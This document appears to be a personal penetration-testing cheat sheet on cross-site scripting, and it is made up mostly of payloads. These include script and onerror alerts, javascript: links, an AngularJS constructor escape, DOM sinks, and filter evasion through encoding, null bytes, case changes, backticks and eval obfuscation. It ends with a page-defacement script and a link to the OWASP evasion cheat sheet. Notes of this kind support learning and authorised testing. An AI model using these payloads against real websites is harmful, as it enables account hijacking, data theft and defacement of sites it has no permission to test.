--- ---

<h2>XSS Injection Technique & Evasion</h2>

Always try to enter DUM texte (ABC123) in parameters and in search query. Simply search on the page if this is reflected anywhere!

- `Website.com//feedback?returnPath=/ABC123`
-  Search Query

Content Security Policy (CSP)
- If you seem able to bypass some filter but cant get any popup, try diffrent event (onmouseover, onload, ...) and also try different variations of the script tag or evasion (javascript:, `<SCipt>`, ...)
```
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self';
```


Type
```
<script>alert('xss')</script>
<img src=x onerror=alert('1')>
javascript:alert(%27xss%27)
```

IMG
```Terminal
<img src=x>

<img src=1 onerror=alert(1)>
```

href
```
href="javascript:alert(1)"
```

DOM
```
location.search      ---> Search in the URL for a parameter
write.document       ---> This will write to the HTML (Adding something depending on the code)
```

- How to exploit: If you have a variable fetching for ID in the URL and then pasting this value to the HTML, you can create a DOM XSS

Other JS Language
```
# AngularJS
<body ng-app="" class="ng-scope">               ---> Interested in the ng-app
{{$on.constructor("alert(1)")()}}               ---> Explained Below
```

- AngularJS
	- the JavaScript `constructor` function to create a new object with a specified function as its `constructor` attribute. The function being passed to the `constructor` attribute is an `alert` function that displays a message. The code then calls the object using the `()` operator, causing the `alert` function to be executed. PS: We can see the code on the page once it is executed

---

<h2>Evasion</h2>

Encoding
```
urlencode "http://example.com/?param=linux+url+encoder"

<img onerror=&#34alert(1)&#34src=x>
<img onerror=&#39alert(1)&#39src=x>
...

<script>Encoding</script>  ---> %3Cscript%3EEncoding%3C%2Fscript%3E
```

- urlencode ---> Tool to encode url (Possible to encode many times)

Basic Modification
```Terminal
#Encoded tabs/newlines/CR
<script&#9>alert(1)</script>
<script&#10>alert(1)</script>
<script&#13>alert(1)</script>

#Capital letters
<ScRipT>alert(1)</sCriPt>

#If angle brackets are encoded
-alert(1)-  ---> (-) replace (> or <)
```

Adding Nullbytes
```Terminal
<%00script>alert(1)</script>
<scr%00ipt>alert(1)</script>
```

Attributes and Tags
```Terminal
<input type="text" name="input" value="hello" >
<input type="text" name="input" value=">< script >alert(1)</script>
<randomtag type="text" name="input" value=">< script >alert(1)</script>
<input/type="text" name="input" value=">< script >alert(1)</script>
<input&#9type="text" name="input" value=">< script >alert(1)</script>
<input&#10type="text" name="input" value=">< script >alert(1)</script>
<input&#13type="text" name="input" value=">< script >alert(1)</script>
<input/'type="text" name="input" value=">< script >alert(1)</script>
<iNpUt type="text" name="input" value=">< script >alert(1)</script>
```

Attributes Nullbytes
```Terminal
<%00input type="text" name="input" value="><script>alert(1)</script>
<inp%00ut type="text" name="input" value="><script>alert(1)</script>
<input t%00ype="text" name="input" value="><script>alert(1)</script>
<input type="text" name="input" value="><script>a%00lert(1)</script>
```

Event Handler
```Terminal
<input onsubmit=alert(1)>

---> onsubmit is the event

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
```

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (VERY GOOD)

Delimiters & Backticks and Brakers
```
#() to Backticks
<img onerror="alert(1)"src=x>
<img onerror='alert(1)'src=x>

#Backticks
	<img onerror=`alert(1)`src=x>
	
#Encoded backtics
	<img onerror=&#96alert(1)&#96src=x>

#Double use of delimiters
	<<script>alert(1)//<</script>

#Unknown delimiters
	«input onsubmit=alert(1)»
```

Oval ()
```Terminal
<script>eval('a\u006cert(1)')</script>
<script>eval('al' + 'ert(1)')</script>
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>    
```

Word Filter (If some javascript element is filtered)
```Terminal
<scrscriptipt > might become <script>
```

HTML Defacing
```Terminal
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
```

---

All Information ---> https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

<iframe src="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" width="100%" height="1300"></iframe>